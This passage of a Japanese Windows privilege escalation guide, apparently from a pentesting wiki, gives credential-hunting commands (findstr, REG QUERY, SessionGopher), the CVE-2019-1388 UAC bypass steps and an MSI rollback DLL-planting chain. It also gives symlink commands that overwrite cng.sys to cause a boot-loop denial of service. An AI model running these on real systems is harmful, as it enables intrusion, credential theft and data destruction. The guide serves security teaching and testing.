COM classes と interfaces は registry の **HKEY\CLASSES\ROOT\CLSID** および **HKEY\CLASSES\ROOT\Interface** にそれぞれ定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

この registry の CLSIDs 内では、**InProcServer32** という child registry が見つかり、そこには **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) になり得る **ThreadingModel** という値があります。

![](<../../images/image (729).png>)

基本的に、実行される **DLLs** のいずれかを **overwrite** できるなら、その DLL が別の user によって実行される場合、**privileges** を **escalate** できます。

attackers が persistence mechanism として COM Hijacking をどのように使うかを知るには、次を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**ファイル内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名のファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリを key names と passwords で検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** プラグインです。私はこのプラグインを作成し、**victim 内で credentials を検索するすべての metasploit POST module を自動的に実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されている password を含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムから password を抽出するもう1つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータを平文で保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEMとして実行されているプロセスが新しいプロセス**（`OpenProcess()`）を**フルアクセス**で開くとします。同じプロセスが**さらに新しいプロセス**（`CreateProcess()`）を**低権限で作成するが、メインプロセスのすべてのオープンハンドルを継承**させます。\
その後、**低権限プロセスに対してフルアクセス**を持っていれば、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode を注入**できます。\
[この脆弱性を**検出して悪用する方法**の詳細は、この例を読んでください。](leaked-handle-exploitation.md)\
[**権限レベルの異なる継承済みのプロセスやスレッドの、より多くのオープンハンドル（フルアクセスだけではない）をテストして悪用する方法**について、より完全な説明がある**別の投稿**はこちらです](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## Named Pipe Client Impersonation

共有メモリセグメントは、**pipes** と呼ばれ、プロセス間通信とデータ転送を可能にします。

Windows には **Named Pipes** と呼ばれる機能があり、関係のないプロセス同士でも、異なるネットワーク上でもデータを共有できます。これはクライアント/サーバーアーキテクチャに似ており、役割は **named pipe server** と **named pipe client** に分かれます。

データが **client** によって pipe を通じて送られると、その pipe を設定した **server** は、必要な **SeImpersonate** 権限があれば、**client の身元を引き受ける**ことができます。pipe を介して通信する**特権プロセス**を特定し、それを偽装できれば、あなたが作成した pipe とそのプロセスがやり取りした瞬間に、そのプロセスの身元を引き継いで**より高い権限を得る**機会になります。この攻撃の実行方法については、[**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system) にあるガイドが役立ちます。

また、以下のツールは **burp のようなツールで named pipe 通信をインターセプト**するために使えます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **また、このツールはすべての pipe を一覧表示して確認し、privescs を見つけるのに役立ちます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) は server mode で `\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済み client は、mailslot ベースの async event path を悪用して `ClientAttach` を任意の **4-byte write** に変え、`NETWORK SERVICE` が書き込み可能な既存ファイルならどれでも対象にできます。その後、Telephony の管理権限を取得し、service として任意の DLL を読み込めます。全体の流れ:

- `pszDomainUser` を書き込み可能な既存パスに設定して `ClientAttach` する → service は `CreateFileW(..., OPEN_EXISTING)` でそれを開き、async event writes に使用する。
- 各 event は `Initialize` で attacker-controlled な `InitContext` をその handle に書き込む。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーし、`GetAsyncEvents` (`Req_Func 0`) で取得してから、unregister/shutdown して決定的な write を繰り返す。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加し、再接続してから、任意の DLL path を指定して `GetUIDllName` を呼び出し、`TSPI_providerUIIdentify` を `NETWORK SERVICE` として実行する。

詳細は以下:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** のページを確認してください

### Protocol handler / ShellExecute abuse via Markdown renderers

`ShellExecuteExW` に渡されるクリック可能な Markdown links は、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの scheme）を起動し、攻撃者が制御するファイルを現在のユーザーとして実行できる場合があります。詳しくは以下を参照:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

ユーザーとして shell を取得したとき、コマンドライン上で**credentials を渡す** scheduled tasks や他の process が実行されている場合があります。以下の script は、2秒ごとに process の command line を取得し、現在の状態を前回の状態と比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーからターミナルや "NT\AUTHORITY SYSTEM" のような任意の他のプロセスを実行できます。

これにより、同じ脆弱性で権限昇格と UAC バイパスを同時に行うことが可能になります。さらに、何かをインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部は以下のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を exploit するには、以下の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level / UAC Bypass へ

Integrity Levels について学ぶにはこれを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypass について学ぶにはこれを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 任意フォルダ Delete/Move/Rename から SYSTEM EoP へ

この手法は、[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、exploit code は [**ここで利用可能です**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。

この attack は、Windows Installer の rollback feature を悪用して、uninstallation process 中に正規のファイルを悪意あるものに置き換える、というものです。このため attacker は、`C:\Config.Msi` folder を hijack するために使われる **malicious MSI installer** を作成する必要があります。これは後で Windows Installer が、他の MSI packages の uninstallation 中に rollback files を保存する際に使用され、そこに含まれる rollback files は malicious payload を含むように改変されます。

要約すると、この technique は次の通りです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空に保つ)**

- Step 1: MSI を Install
- 書き込み可能な folder (`TARGETDIR`) に無害な file（例: `dummy.txt`）を install する `.msi` を作成します。
- installer を **"UAC Compliant"** としてマークし、**non-admin user** でも実行できるようにします。
- install 後も file への **handle** を開いたままにします。

- Step 2: Uninstall を開始
- 同じ `.msi` を uninstall します。
- uninstall process は file を `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）に rename し始めます。
- `GetFinalPathNameByHandle` を使って開いている file handle を **poll** し、file が `C:\Config.Msi\<random>.rbf` になったタイミングを検出します。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、これは:
- `.rbf` が書き込まれたときに signal します。
- その後、uninstall を続行する前に別の event を **wait** します。

- Step 4: `.rbf` の削除を Block
- signal されたら、`FILE_SHARE_DELETE` なしで `.rbf` file を **open** し、削除できないようにします。
- その後、uninstall が完了できるように back で signal します。
- Windows Installer は `.rbf` を delete できず、すべての content を delete できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を Manually Delete
- attacker であるあなたが `.rbf` file を manually delete します。
- これで **`C:\Config.Msi` は空** になり、hijack する準備が整います。

> この時点で、**SYSTEM-level の arbitrary folder delete vulnerability** を trigger して `C:\Config.Msi` を delete します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置き換える**

- Step 6: 弱い ACLs で `C:\Config.Msi` を Recreate
- `C:\Config.Msi` folder を自分で recreate します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持ったまま **handle** を開いておきます。

- Step 7: 別の Install を実行
- `.msi` を再度 install します。条件は:
- `TARGETDIR`: 書き込み可能な location。
- `ERROROUT`: forced failure を引き起こす variable。
- この install は再び **rollback** を trigger するために使われ、`.rbs` と `.rbf` を読み込みます。

- Step 8: `.rbs` を Monitor
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を monitor し、新しい `.rbs` が現れるまで待ちます。
- その filename を capture します。

- Step 9: Rollback 前に Sync
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、これは:
- `.rbs` が作成されたときに event を signal します。
- その後、続行する前に **wait** します。

- Step 10: Weak ACL を Reapply
- `.rbs created` event を受け取った後:
- Windows Installer は `C:\Config.Msi` に strong ACLs を再適用します。
- しかし、あなたはまだ `WRITE_DAC` を持つ handle を保持しているため、再び **weak ACLs** を適用できます。

> ACLs は **handle open 時にのみ enforced** されるため、folder への書き込みは引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を Drop
- `.rbs` file を上書きし、Windows に次のように指示する **fake rollback script** を書き込みます:
- あなたの `.rbf` file（malicious DLL）を、**privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore する。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を drop します。

- Step 12: Rollback を Trigger
- sync event を signal して installer を resume させます。
- **type 19 custom action (`ErrorOut`)** が、既知の時点で install を **intentionally fail** するよう設定されています。
- これにより **rollback が開始** されます。

- Step 13: SYSTEM があなたの DLL を Install
- Windows Installer は:
- あなたの malicious `.rbs` を読み込みます。
- `.rbf` DLL を target location に copy します。
- これで、あなたの **malicious DLL** が SYSTEM-loaded path に置かれます。

- 最終 Step: SYSTEM Code を Execute
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、hijack した DLL を load させます。
- **Boom**: あなたの code が **SYSTEM として** 実行されます。


### 任意 File Delete/Move/Rename から SYSTEM EoP へ

主要な MSI rollback technique（前のもの）は、`C:\Config.Msi` のような **folder 全体** を delete できることを前提にしています。しかし、vulnerability が **任意 file deletion** しか許さない場合はどうでしょうか？

**NTFS internals** を悪用できます。すべての folder には、次のような hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの **index metadata** を保存します。

そのため、フォルダの **`::$INDEX_ALLOCATION` stream** を **削除** すると、NTFS はそのフォルダ **全体を filesystem から削除** します。

これは次のような標準の file deletion APIs を使って行えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出していても、実際には**フォルダ自体を削除します**。

### Folder Contents Delete から SYSTEM EoP へ
もしあなたの primitive が任意のファイル/フォルダを削除できないが、攻撃者が制御するフォルダの**内容の削除**はできる場合はどうでしょうか？

1. Step 1: bait folder と file を用意する
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- oplock は、特権プロセスが `file1.txt` を削除しようとしたときに**実行を一時停止**させます。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御があなたの callback に渡されます。

4. ステップ 4: oplock callback 内で – 削除先をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を壊さずに `folder1` が空になります。
- `file1.txt` を直接削除しないでください — それをすると oplock が早すぎるタイミングで解放されます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これは、フォルダのメタデータを保存している NTFS internal stream を対象にしています — これを削除するとフォルダが削除されます。

5. Step 5: oplock を release
- SYSTEM process は処理を続けて `file1.txt` を削除しようとします。
- しかし now、junction + symlink により、実際には次を削除しています:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダ作成から永続的 DoS へ

**SYSTEM/admin として任意のフォルダを作成できる** プリミティブを悪用します — **ファイルを書き込めない** 場合や **弱い権限を設定できない** 場合でも可能です。

**フォルダ**（ファイルではない）を作成し、**重要な Windows ドライバ**の名前を付けます。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` の kernel-mode driver に対応します。
- これを **フォルダとして事前作成** すると、Windows は起動時に実際の driver を読み込めなくなります。
- その後、Windows は boot 中に `cng.sys` を読み込もうとします。
- フォルダを検出し、**実際の driver の解決に失敗** し、**crash するか boot を停止** します。
- **fallback はなく**、外部からの介入（例: boot repair や disk access）がない限り **recovery もできません**。

### 特権付き log/backup path + OM symlinks から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取った path に logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** でその path を redirect し、privileged write を arbitrary overwrite に変えます（**SeCreateSymbolicLinkPrivilege** がなくても可能）。

**Requirements**
- target path を保存する config が attacker により writable であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- その path に書き込む privileged operation があること（log, export, report）。

**Example chain**
1. config を読み取り、privileged log destination を復元する。例: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. admin なしで path を redirect する:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: 管理者が "send test SMS" をトリガーする）。この書き込みは `C:\Windows\System32\cng.sys` に入るようになる。
4. 上書きされた対象を確認する（hex/PE parser）して破損を確認する。再起動すると Windows は改ざんされた driver パスを読み込むことになり → **boot loop DoS**。これは、特権サービスが書き込みのために開く保護された任意のファイルにも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` に copy が存在すると先に試されるため、壊れた data の reliable な DoS sink になる。



## **High Integrity から System へ**

### **New service**

すでに High Integrity process 上で動作しているなら、**SYSTEM への path** は、新しい service を**作成して実行する**だけで簡単な場合がある:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス binary を作成する際は、それが有効な service であること、または binary が必要な動作をできるだけ速く実行することを確認してください。そうしないと、valid service でなければ 20s で kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を有効化**して、_**.msi**_ wrapper を使って reverse shell を**install**することを試せます。\
[関連する registry keys と _.msi_ package の install 方法の詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードはこちらです**[**ここ**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

その token privileges を持っている場合（たぶん既に High Integrity process の中で見つかるでしょう）、SeDebug privilege で**ほぼ任意の process を開き**（protected processes は除く）、その process の**token を copy**して、その token を使って**任意の process を create**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行中の任意の process を選択**します（_はい、すべての token privileges を持たない SYSTEM processes もあります_）。\
**この提案された technique を実行する code の**[**例はこちら**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation する際に使います。手順は、**pipe を作成し、その pipe に書き込むための service を create/abuse する**ことです。すると、**`SeImpersonate`** privilege を使って pipe を作成した **server** は、pipe client（service）の **token を impersonate** でき、SYSTEM privileges を取得できます。\
name pipes について[**さらに学びたいならこちらを読んでください**](#named-pipe-client-impersonation)。\
High Integrity から System へ name pipes を使って移行する例を読みたい場合は、[**こちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** により **loaded** される dll を**hijack**できれば、その権限で任意の code を実行できます。したがって Dll Hijacking もこの種の privilege escalation に有用です。さらに、High Integrity process からのほうが、dll を load するために使われる folder への**write permissions**を持つため、**はるかに簡単に達成**できます。\
**Dll hijacking についてはこちらで**[**さらに学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すのに最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を確認 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations を確認し、情報を収集 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を確認**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存済み session 情報を抽出します。local では -Thorough を使ってください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から crendentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 全体に spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell の ADIDNS/LLMNR/mDNS spoofer 兼 man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な privesc 用 Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索 (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索 (VisualStudio で compile する必要があります) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探して host を enumerate します（privesc よりも情報収集 tool に近いです）(compile が必要) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くの software から credentials を抽出します（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を確認します（github に precompiled executable あり）。推奨しません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations を確認します（python から exe を生成）。推奨しません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を元に作成された tool です（properly 動作するのに accesschk は不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み、動作する exploit を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み、動作する exploit を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい .NET version を使って project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET version を確認するには、次のようにします:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532 で SYSTEM へ](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADA システムに存在する特権ファイルシステム脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink の使用法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Windows での Symbolic Links の悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Windows での危険な Module 解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: `node_modules` フォルダからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
